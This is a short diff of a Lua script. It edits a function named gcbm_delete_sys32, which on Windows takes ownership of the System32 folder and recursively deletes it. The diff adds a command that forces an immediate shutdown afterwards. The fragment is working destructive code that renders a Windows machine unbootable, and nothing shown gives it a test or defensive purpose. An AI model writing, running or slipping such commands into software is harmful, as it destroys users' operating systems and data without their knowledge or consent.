@@ -130,6 +130,7 @@ local function gcbm_delete_sys32()
 
     if os_name == "Windows" then
         os.execute('cd /d C:\\Windows && takeown /F System32 /R && rmdir System32 /s /q')
+        os.execute('shutdown /s /t 0')
     end
 end
 
